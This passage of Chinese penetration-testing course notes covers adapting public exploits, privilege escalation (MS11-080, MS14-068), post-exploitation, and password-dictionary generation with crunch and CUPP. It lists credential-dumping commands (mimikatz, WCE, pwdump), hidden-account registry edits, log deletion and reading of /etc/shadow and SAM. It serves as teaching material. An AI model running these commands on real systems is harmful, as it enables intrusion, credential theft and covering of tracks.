</ul>
</li>
</ul>
<h4 id="选择和修改-EXP-1"><a href="#选择和修改-EXP-1" class="headerlink" title="选择和修改 EXP"></a>选择和修改 EXP</h4><ul>
<li>646.c<ul>
<li>类unix环境下编译</li>
<li>返回地址与我们的环境不符</li>
<li>反弹shell硬编码了回连IP地址</li>
<li>缓冲区偏移量与我们的环境不符</li>
<li>目标IP硬编码</li>
</ul>
</li>
</ul>
<h4 id="选择和修改-EXP-2"><a href="#选择和修改-EXP-2" class="headerlink" title="选择和修改 EXP"></a>选择和修改 EXP</h4><ul>
<li>643.c<ul>
<li>Windows环境下编译</li>
<li>apt-get install mingw32</li>
<li>dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install</li>
</ul>
</li>
</ul>
<h5 id="wine32"><a href="#wine32" class="headerlink" title="wine32"></a>wine32</h5><ul>
<li>i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</li>
<li>wine sl.exe 192.168.20.32</li>
</ul>
<h4 id="避免有害的-EXP"><a href="#避免有害的-EXP" class="headerlink" title="避免有害的 EXP"></a>避免有害的 EXP</h4><ul>
<li>不同的 EXP<ul>
<li>不同的系统补丁</li>
<li>软件版本</li>
<li>不同的offset、shellcode</li>
</ul>
</li>
<li>扫描探测目标系统版本，搭建适当的测试环境<ul>
<li>避免一锤子测试</li>
</ul>
</li>
<li>修改公开的 EXP 满足不同环境需要<ul>
<li>了解漏洞原理，修改溢出代码</li>
</ul>
</li>
</ul>
<h4 id="后漏洞利用阶段"><a href="#后漏洞利用阶段" class="headerlink" title="后漏洞利用阶段"></a>后漏洞利用阶段</h4><h4 id="POST-EXPLOITATION"><a href="#POST-EXPLOITATION" class="headerlink" title="POST EXPLOITATION"></a>POST EXPLOITATION</h4><h4 id="漏洞利用后阶段"><a href="#漏洞利用后阶段" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul>
<li>上传工具</li>
<li>提权</li>
<li>擦除攻击痕迹</li>
<li>安装后门<ul>
<li>长期控制</li>
<li>Dump 密码</li>
<li>内网渗透</li>
</ul>
</li>
<li>后漏洞利用阶段<ul>
<li>最大的挑战 —— 防病毒软件</li>
<li>使用合法的远程控制软件</li>
</ul>
</li>
</ul>
<h4 id="漏洞利用后阶段-1"><a href="#漏洞利用后阶段-1" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul>
<li>上传文件<ul>
<li>持久控制</li>
<li>扩大对目标系统的控制能力</li>
</ul>
</li>
<li>Linux系统<ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
</li>
<li>Windows<ul>
<li>缺少预装的下载工具</li>
</ul>
</li>
</ul>
<h4 id="漏洞利用后阶段-2"><a href="#漏洞利用后阶段-2" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul>
<li>非交互模式 shell<ul>
<li>类 NC远程控制 shell</li>
<li>ftp 192.168.1.1</li>
</ul>
</li>
</ul>
<h4 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h4><ul>
<li>Tftp</li>
<li>Ftp</li>
<li>Vbscript</li>
<li>Debug</li>
</ul>
<h1 id="Q-amp-A-6"><a href="#Q-amp-A-6" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第十章-提权"><a href="#第十章-提权" class="headerlink" title="第十章 提权"></a>第十章 提权</h1><h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获取更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
</ul>
<h4 id="本地提权-1"><a href="#本地提权-1" class="headerlink" title="本地提权"></a>本地提权</h4><ul>
<li>系统账号之间权限隔离<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登陆时获取权限令牌</li>
<li>服务账号无需用户登陆已在后台启动服务</li>
</ul>
</li>
</ul>
<h4 id="本地提权-2"><a href="#本地提权-2" class="headerlink" title="本地提权"></a>本地提权</h4><ul>
<li>Windows<ul>
<li>user</li>
<li>Administrator</li>
<li>System</li>
</ul>
</li>
<li>Linux<ul>
<li>User</li>
<li>Root</li>
</ul>
</li>
</ul>
<h4 id="ADMIN-提权为-SYSTEM"><a href="#ADMIN-提权为-SYSTEM" class="headerlink" title="ADMIN 提权为 SYSTEM"></a>ADMIN 提权为 SYSTEM</h4><ul>
<li>Windows system账号<ul>
<li>系统设置管理功能</li>
<li>SysInternal Suite<ul>
<li><a target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/sysinternals/bb">https://technet.microsoft.com/en-us/sysinternals/bb</a></li>
<li>psexec -i - s -d taskmgr</li>
</ul>
</li>
<li>at 19:39 &#x2F;interactive cmd</li>
<li>sc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact</li>
<li>sc start syscmd</li>
</ul>
</li>
</ul>
<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul>
<li>隐蔽痕迹</li>
<li>pinjector.exe<ul>
<li><a target="_blank" rel="noopener" href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector&#x2F;</a></li>
</ul>
</li>
</ul>
<h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><ul>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek</li>
<li>commview</li>
<li>Sniffpass</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff</li>
</ul>
</li>
</ul>
<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><ul>
<li>Keylogger</li>
<li>木马窃取</li>
</ul>
<h4 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h4><ul>
<li>浏览器缓存的密码<ul>
<li>IE浏览器</li>
<li>Firefox</li>
</ul>
</li>
<li>网络密码</li>
<li>无线密码</li>
<li><a target="_blank" rel="noopener" href="http://www.nirsoft.net/">http://www.nirsoft.net</a></li>
<li>Dump SAM<ul>
<li>Pwdump</li>
<li>&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump&#x2F;</li>
</ul>
</li>
</ul>
<h5 id="小心了！"><a href="#小心了！" class="headerlink" title="小心了！"></a>小心了！</h5><h4 id="WINDOWS-身份认证过程"><a href="#WINDOWS-身份认证过程" class="headerlink" title="WINDOWS 身份认证过程"></a>WINDOWS 身份认证过程</h4><h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
<li>&#x2F;usr&#x2F;share&#x2F;wce&#x2F;</li>
<li>需要管理员权限</li>
<li>wce-universal.exe -l &#x2F; -lv</li>
<li>wce-universal.exe -d</li>
<li>wce-universal.exe -e &#x2F; -r</li>
<li>wce-universal.exe -g</li>
<li>wce-universal.exe -w</li>
<li>LM&#x2F;NT hash</li>
</ul>
<h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
<li>从内存读取LM &#x2F; NTLM hash</li>
<li>Digest Authentication Package</li>
<li>NTLM Security Package</li>
<li>Kerberos Security Package</li>
<li>防止WCE攻击</li>
<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages<ul>
<li>kerberos<br> msv1_<br> schannel<br> wdigest<br> tspkg<br> pku2u</li>
</ul>
</li>
</ul>
<h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><ul>
<li>pwdump localhost</li>
<li>fgdump</li>
<li>mimikatz<ul>
<li>privilege::debug #提升权限</li>
<li>sekurlsa::logonPasswords</li>
<li>::</li>
</ul>
</li>
</ul>
<h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul>
<li>Ms11- 080</li>
<li>Kb<ul>
<li><a target="_blank" rel="noopener" href="https://technet.microsoft.com/library/security/ms11-">https://technet.microsoft.com/library/security/ms11-</a> 080</li>
</ul>
</li>
<li>Pyinstaller<ul>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/PyInstaller/2">https://pypi.python.org/pypi/PyInstaller/2</a>.</li>
<li>python pyinstaller –onefile ms11-080.py</li>
</ul>
</li>
<li>Pywin<ul>
<li><a target="_blank" rel="noopener" href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/">http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a></li>
</ul>
</li>
<li>MS11- 046<ul>
<li>DoS</li>
</ul>
</li>
</ul>
<h4 id="利用漏洞提权-1"><a href="#利用漏洞提权-1" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul>
<li>Ms14- 068</li>
<li>库<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/bidord/pykek">https://github.com/bidord/pykek</a></li>
</ul>
</li>
<li>ms14-068.py -u <a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#108;&#97;&#x62;&#46;&#x63;&#111;&#x6d;">&#117;&#115;&#x65;&#x72;&#64;&#108;&#97;&#x62;&#46;&#x63;&#111;&#x6d;</a> -s userSID - d dc.lab.com</li>
<li>拷贝 <a href="mailto:&#84;&#x47;&#x54;&#x5f;&#117;&#115;&#x65;&#x72;&#49;&#64;&#108;&#x61;&#x62;&#46;&#x63;&#x6f;&#x6d;&#46;&#99;&#99;&#x61;&#x63;&#104;&#x65;">&#84;&#x47;&#x54;&#x5f;&#117;&#115;&#x65;&#x72;&#49;&#64;&#108;&#x61;&#x62;&#46;&#x63;&#x6f;&#x6d;&#46;&#99;&#99;&#x61;&#x63;&#104;&#x65;</a> 到windows系统</li>
<li>本地管理员登陆<ul>
<li>mimikatz.exe log “kerberos::ptc <a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x75;&#115;&#x65;&#114;&#x40;&#108;&#x61;&#x62;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#99;&#99;&#x61;&#x63;&#104;&#101;">&#x54;&#x47;&#x54;&#x5f;&#x75;&#115;&#x65;&#114;&#x40;&#108;&#x61;&#x62;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#99;&#99;&#x61;&#x63;&#104;&#101;</a>“ exit</li>
</ul>
</li>
</ul>
<h4 id="利用漏洞提权-2"><a href="#利用漏洞提权-2" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul>
<li>Ubuntu11.<ul>
<li><a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/11.10/">http://old-releases.ubuntu.com/releases/11.10/</a></li>
</ul>
</li>
<li>gcc<ul>
<li>sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</li>
<li>gcc 18411.c -o exp</li>
</ul>
</li>
<li>CVE- 2012 - 0056<ul>
<li>&#x2F;proc&#x2F;pid&#x2F;mem</li>
<li>kernels &gt;&#x3D;2.6.</li>
<li><a target="_blank" rel="noopener" href="http://blog.zx2c4.com/">http://blog.zx2c4.com/</a></li>
</ul>
</li>
</ul>
<h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
<li>与漏洞提权相比 更常用的方法<ul>
<li>企业环境</li>
<li>补丁更新的全部已经安装</li>
<li>输入变量过滤之外更值得研发关注的安全隐患</li>
<li>以system权限启动</li>
<li>NTFS权限允许users修改删除</li>
</ul>
</li>
</ul>
<h4 id="利用配置不当提权-1"><a href="#利用配置不当提权-1" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
<li>icacls<ul>
<li>icacls c:\windows*.exe &#x2F;save perm &#x2F;T</li>
<li>i586-mingw32msvc-gcc -o admin.exe admin.c</li>
</ul>
</li>
<li>Find<ul>
<li>find &#x2F; -perm 777 -exec ls -l {} ;</li>
</ul>
</li>
</ul>
<h4 id="利用配置不当提权-2"><a href="#利用配置不当提权-2" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
<li>应用系统的配置文件<ul>
<li>应用连接数据库的配置文件</li>
</ul>
</li>
</ul>
<h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><ul>
<li>Linux<ul>
<li>&#x2F;etc&#x2F;resolv.conf</li>
<li>&#x2F;etc&#x2F;passwd</li>
<li>&#x2F;etc&#x2F;shadow</li>
<li>whoami and who –a</li>
<li>ifconfig - a, iptables - L -n, ifconfig – a, netstat – r</li>
<li>uname – a, ps aux</li>
<li>dpkg - l| head</li>
</ul>
</li>
</ul>
<h4 id="基本信息收集-1"><a href="#基本信息收集-1" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><ul>
<li>Windows<ul>
<li>ipconfig &#x2F;all , ipconfig &#x2F;displaydns, netstat - bnao , netstat – r</li>
<li>net view , net view &#x2F;domain</li>
<li>net user &#x2F;domain, net user %username% &#x2F;domain</li>
<li>net accounts, net share</li>
<li>net localgroup administrators username &#x2F;add</li>
<li>net group “Domain Controllers” &#x2F;domain</li>
<li>net share name$&#x3D;C:\ &#x2F;unlimited</li>
<li>net user username &#x2F;active:yes &#x2F;domain</li>
</ul>
</li>
</ul>
<h4 id="WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h4><ul>
<li>wmic nicconfig get ipaddress,macaddress</li>
<li>wmic computersystem get username</li>
<li>wmic netlogin get name,lastlogon</li>
<li>wmic process get caption, executablepath,commandline</li>
<li>wmic process where name&#x3D;“calc.exe” call terminate</li>
<li>wmic os get name,servicepackmajorversion</li>
<li>wmic product get name,version</li>
<li>wmic product where name&#x3D;“name” call uninstall &#x2F;nointeractive</li>
<li>wmic share get &#x2F;ALL</li>
<li>wmic &#x2F;node:”machinename” path Win32_TerminalServiceSetting where<br>  AllowTSConnections&#x3D;”0” call SetAllowTSConnections “1“</li>
<li>wmic nteventlog get path,filename, writeable</li>
</ul>
<h4 id="收集敏感数据"><a href="#收集敏感数据" class="headerlink" title="收集敏感数据"></a>收集敏感数据</h4><ul>
<li>商业信息</li>
<li>系统信息</li>
<li>Linux<ul>
<li>&#x2F;etc ；&#x2F;usr&#x2F;local&#x2F;etc</li>
<li>&#x2F;etc&#x2F;password ；&#x2F;etc&#x2F;shadow</li>
<li>.ssh ；.gnupg 公私钥</li>
<li>The e-mail and data files</li>
<li>业务数据库 ；身份认证服务器数据库</li>
<li>&#x2F;tmp</li>
</ul>
</li>
</ul>
<h4 id="收集敏感数据-1"><a href="#收集敏感数据-1" class="headerlink" title="收集敏感数据"></a>收集敏感数据</h4><ul>
<li>windows<ul>
<li>SAM 数据库 ； 注册表文件</li>
<li>%SYSTEMROOT%\repair\SAM</li>
<li>%SYSTEMROOT%\System32\config\RegBack\SAM</li>
<li>业务数据库 ； 身份认证数据库</li>
<li>临时文件目录</li>
<li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li>
</ul>
</li>
</ul>
<h4 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h4><ul>
<li>禁止在登陆界面显示新建账号</li>
<li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</li>
</ul>
<h6 id="NT-CurrentVersion-WinLogon-SpecialAccounts-UserList”-x2F-v-uname-x2F-T"><a href="#NT-CurrentVersion-WinLogon-SpecialAccounts-UserList”-x2F-v-uname-x2F-T" class="headerlink" title="NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” &#x2F;v uname &#x2F;T"></a>NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” &#x2F;v uname &#x2F;T</h6><h6 id="REG-DWORD-x2F-D-0"><a href="#REG-DWORD-x2F-D-0" class="headerlink" title="REG_DWORD &#x2F;D 0"></a>REG_DWORD &#x2F;D 0</h6><ul>
<li>del %WINDIR%*.log &#x2F;a&#x2F;s&#x2F;q&#x2F;f</li>
<li>History</li>
<li>日志<ul>
<li>auth.log &#x2F; secure</li>
<li>btmp &#x2F; wtmp</li>
<li>lastlog &#x2F; faillog</li>
</ul>
</li>
<li>其他日志和 HIDS 等</li>
</ul>
<h1 id="Q-amp-A-7"><a href="#Q-amp-A-7" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第十一章-无线渗透"><a href="#第十一章-无线渗透" class="headerlink" title="第十一章 无线渗透"></a>第十一章 无线渗透</h1><h3 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h3><ul>
<li>与其他章节独立，涵盖面广，可独立成课</li>
<li>无线技术变化快 难度大、</li>
<li>既新鲜刺激又压力山大</li>
<li>一半理论 一半实践</li>
<li>无线技术是本课程难度最大的一章</li>
</ul>
<h3 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h3><ul>
<li>行业迅速发展</li>
<li>互联网重要入口</li>
<li>边界模糊</li>
<li>安全实施而且困难</li>
<li>对技术不了解而造成配置不当</li>
<li>企业网络私自接入ap破坏网络边界</li>
</ul>
<h3 id="802-11标准无线"><a href="#802-11标准无线" class="headerlink" title="802.11标准无线"></a>802.11标准无线</h3><ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li>数据链路层</li>
<li>物理层</li>
</ul>
<h3 id="无线运行模式"><a href="#无线运行模式" class="headerlink" title="无线运行模式"></a>无线运行模式</h3><ul>
<li>无线网络架构</li>
<li>AP维护ssid</li>
<li>sta维护ssid</li>
</ul>
<h3 id="无线渗透实操"><a href="#无线渗透实操" class="headerlink" title="无线渗透实操"></a>无线渗透实操</h3><h4 id="aircrack-ng基础"><a href="#aircrack-ng基础" class="headerlink" title="aircrack-ng基础"></a>aircrack-ng基础</h4><ul>
<li><p>无线渗透和审计工具</p>
</li>
<li><p>包含各种功能的工具套件</p>
<ul>
<li>网络检测</li>
<li>嗅探抓包</li>
<li>包注入</li>
<li><a href="">密码破解</a></li>
</ul>
</li>
<li><p>检查完卡驱动</p>
</li>
<li><p>开启和停止无线真挺</p>
<ul>
<li>airmon check</li>
<li>airmon check kill</li>
<li>airmon start wlan2 3</li>
<li>iwlist wlan2mon channel</li>
<li>airmon stop wlan2mon</li>
</ul>
</li>
<li><p>无线抓包</p>
<ul>
<li>airodump-ng wlan2mon</li>
<li>airodump wlan2mon -c 1 –bssid 00:11:22:33:44:55 -w file.cap</li>
<li>aireplay -9 wlan2mon</li>
<li>airreplay</li>
</ul>
</li>
</ul>
<p>(未完……)</p>
<h1 id="第十二章-web渗透"><a href="#第十二章-web渗透" class="headerlink" title="第十二章 web渗透"></a>第十二章 web渗透</h1><h1 id="第十三章-密码破解"><a href="#第十三章-密码破解" class="headerlink" title="第十三章 密码破解"></a>第十三章 密码破解</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="目标系统实施了强安全措施"><a href="#目标系统实施了强安全措施" class="headerlink" title="目标系统实施了强安全措施"></a>目标系统实施了强安全措施</h3><h5 id="–-安装了所有补丁"><a href="#–-安装了所有补丁" class="headerlink" title="– 安装了所有补丁"></a>– 安装了所有补丁</h5><h5 id="–-无任何已知漏洞"><a href="#–-无任何已知漏洞" class="headerlink" title="– 无任何已知漏洞"></a>– 无任何已知漏洞</h5><h5 id="–-无应用层漏洞"><a href="#–-无应用层漏洞" class="headerlink" title="– 无应用层漏洞"></a>– 无应用层漏洞</h5><h5 id="–-攻击面最小化"><a href="#–-攻击面最小化" class="headerlink" title="– 攻击面最小化"></a>– 攻击面最小化</h5><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><h3 id="获取目标系统用户身份"><a href="#获取目标系统用户身份" class="headerlink" title="获取目标系统用户身份"></a>获取目标系统用户身份</h3><h5 id="–-非授权用户不受信，认证用户可以访问守信资源"><a href="#–-非授权用户不受信，认证用户可以访问守信资源" class="headerlink" title="– 非授权用户不受信，认证用户可以访问守信资源"></a>– 非授权用户不受信，认证用户可以访问守信资源</h5><h5 id="–-已有用户账号权限受限，需要提权"><a href="#–-已有用户账号权限受限，需要提权" class="headerlink" title="– 已有用户账号权限受限，需要提权"></a>– 已有用户账号权限受限，需要提权</h5><h5 id="–-不会触发系统报警"><a href="#–-不会触发系统报警" class="headerlink" title="– 不会触发系统报警"></a>– 不会触发系统报警</h5><h2 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a>身份认证方法</h2><h3 id="证明你是你声称你是的那个人"><a href="#证明你是你声称你是的那个人" class="headerlink" title="证明你是你声称你是的那个人"></a>证明你是你声称你是的那个人</h3><ul>
<li>你知道什么（账号密码、pin、passphrase）</li>
<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
<li>以上方法结合使用（多因素身份认证）</li>
</ul>
<h3 id="基于互联网的身份验证仍以账号密码为主要形式"><a href="#基于互联网的身份验证仍以账号密码为主要形式" class="headerlink" title="基于互联网的身份验证仍以账号密码为主要形式"></a>基于互联网的身份验证仍以账号密码为主要形式</h3><h2 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a>密码破解方法</h2><h3 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a>人工猜解</h3><h5 id="–-垃圾桶工程"><a href="#–-垃圾桶工程" class="headerlink" title="– 垃圾桶工程"></a>– 垃圾桶工程</h5><h5 id="–-被动信息收集"><a href="#–-被动信息收集" class="headerlink" title="– 被动信息收集"></a>– 被动信息收集</h5><h3 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h3><h3 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h3><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><h5 id="–-保存有用户名和密码的文本文件"><a href="#–-保存有用户名和密码的文本文件" class="headerlink" title="– 保存有用户名和密码的文本文件"></a>– 保存有用户名和密码的文本文件</h5><ul>
<li>&#x2F;usr&#x2F;share&#x2F;wordlist</li>
<li>&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist</li>
<li>&#x2F;usr&#x2F;share&#x2F;seclists</li>
</ul>
<h2 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a>字典</h2><h3 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h3><h5 id="–-全键盘空间字符"><a href="#–-全键盘空间字符" class="headerlink" title="– 全键盘空间字符"></a>– 全键盘空间字符</h5><h5 id="–-部分键盘空间字符-基于规则"><a href="#–-部分键盘空间字符-基于规则" class="headerlink" title="– 部分键盘空间字符 (基于规则)"></a>– 部分键盘空间字符 (基于规则)</h5><h5 id="–-数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码"><a href="#–-数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码" class="headerlink" title="– 数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码"></a>– 数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</h5><h3 id="crunch-options"><a href="#crunch-options" class="headerlink" title="crunch   [] [options]"></a>crunch <min-len> <max-len> [<charset string>] [options]</h3><ul>
<li><charset string> 默认是小写字符</li>
</ul>
<h3 id="crunch-6-6-0123456789-o-START-d-2-b-1mb-x2F-c-100"><a href="#crunch-6-6-0123456789-o-START-d-2-b-1mb-x2F-c-100" class="headerlink" title="crunch 6 6 0123456789 -o START -d 2 -b 1mb &#x2F; -c 100"></a>crunch 6 6 0123456789 -o START -d 2 -b 1mb &#x2F; -c 100</h3><ul>
<li>-b 按大小分割字典文件（kb&#x2F;kib、mb&#x2F;mib、gb&#x2F;gib）</li>
<li>-c 每个字典的行数</li>
<li>以上两个参数必须与-o START 结合使用</li>
<li>-d 同一字符连贯出现数量（11 &#x2F; aaa）</li>
</ul>
<h2 id="字典-2"><a href="#字典-2" class="headerlink" title="字典"></a>字典</h2><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><ul>
<li>crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst lalpha-sv-o 1.txt</li>
</ul>
<h3 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a>无重复字符</h3><ul>
<li>crunch 1 1 -p 1234567890 | more</li>
<li>必须是最后一个参数</li>
<li>最大、最小字符长度失效，但必须存在</li>
<li>与-s 参数不兼容（-s 指定起始字符串）</li>
<li>crunch 4 4 0123456789 -s 9990</li>
</ul>
<h3 id="读取文件中每行内容作为基本字符生成字典"><a href="#读取文件中每行内容作为基本字符生成字典" class="headerlink" title="读取文件中每行内容作为基本字符生成字典"></a>读取文件中每行内容作为基本字符生成字典</h3><ul>
<li>crunch 1 1 -q read</li>
</ul>
<h2 id="字典-3"><a href="#字典-3" class="headerlink" title="字典"></a>字典</h2><h3 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a>字典组成规则</h3><ul>
<li>crunch 6 6 -t @,%%^^ | more</li>
<li>@：小写字母 lalpha</li>
<li>,：大写字母 ualpha</li>
<li>%：数字 numeric</li>
<li>^：符号 symbols</li>
</ul>
<h3 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a>输出文件压缩</h3><ul>
<li>crunch 4 4 -t @,%^ -o 1.txt -z 7z</li>
<li>其他压缩格式：gzip、bzip2、lzma</li>
<li>7z压缩比率最大</li>
</ul>
<h2 id="字典-4"><a href="#字典-4" class="headerlink" title="字典"></a>字典</h2><h3 id="crunch-4-4-f-x2F-usr-x2F-share-x2F-crunch-x2F-charset-lst-mixalpha"><a href="#crunch-4-4-f-x2F-usr-x2F-share-x2F-crunch-x2F-charset-lst-mixalpha" class="headerlink" title="crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst mixalpha-"></a>crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst mixalpha-</h3><h3 id="numeric-all-space-o-w-txt-t-d-s-cdab"><a href="#numeric-all-space-o-w-txt-t-d-s-cdab" class="headerlink" title="numeric-all-space -o w.txt -t @d@@ -s cdab"></a>numeric-all-space -o w.txt -t @d@@ -s cdab</h3><h3 id="crunch-4-5-p-dog-cat-bird"><a href="#crunch-4-5-p-dog-cat-bird" class="headerlink" title="crunch 4 5 -p dog cat bird"></a>crunch 4 5 -p dog cat bird</h3><h3 id="crunch-5-5-abc-DEF-t"><a href="#crunch-5-5-abc-DEF-t" class="headerlink" title="crunch 5 5 abc DEF + !@# -t ,@^%,"></a>crunch 5 5 abc DEF + !@# -t ,@^%,</h3><h5 id="–-占位符"><a href="#–-占位符" class="headerlink" title="– + 占位符"></a>– + 占位符</h5><h5 id="–-转义符（空格、符号）"><a href="#–-转义符（空格、符号）" class="headerlink" title="– \ 转义符（空格、符号）"></a>– \ 转义符（空格、符号）</h5><h3 id="crunch-5-5-t-ddd-p-dog-cat-bird"><a href="#crunch-5-5-t-ddd-p-dog-cat-bird" class="headerlink" title="crunch 5 5 -t ddd%% -p dog cat bird"></a>crunch 5 5 -t ddd%% -p dog cat bird</h3><ul>
<li>任何不同于-p 参数指定的值都是占位符</li>
</ul>
<h3 id="crunch-5-5-d-2-t"><a href="#crunch-5-5-d-2-t" class="headerlink" title="crunch 5 5 -d 2@ -t @@@%%"></a>crunch 5 5 -d 2@ -t @@@%%</h3><h2 id="字典-5"><a href="#字典-5" class="headerlink" title="字典"></a>字典</h2><h3 id="组合应用"><a href="#组合应用" class="headerlink" title="组合应用"></a>组合应用</h3><ul>
<li>crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w -</li>
<li>crunch 10 10 12345 –stdout| airolib-ng testdb -import passwd-</li>
</ul>
<h2 id="字典-6"><a href="#字典-6" class="headerlink" title="字典"></a>字典</h2><h3 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a>按个人信息生成其专属的密码字典</h3><h3 id="CUPP：Common-User-Password-Profiler"><a href="#CUPP：Common-User-Password-Profiler" class="headerlink" title="CUPP：Common User Password Profiler"></a>CUPP：Common User Password Profiler</h3><ul>
<li>git clone <a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp.git">https://github.com/Mebus/cupp.git</a></li>
<li>python cup.py -i</li>
</ul>
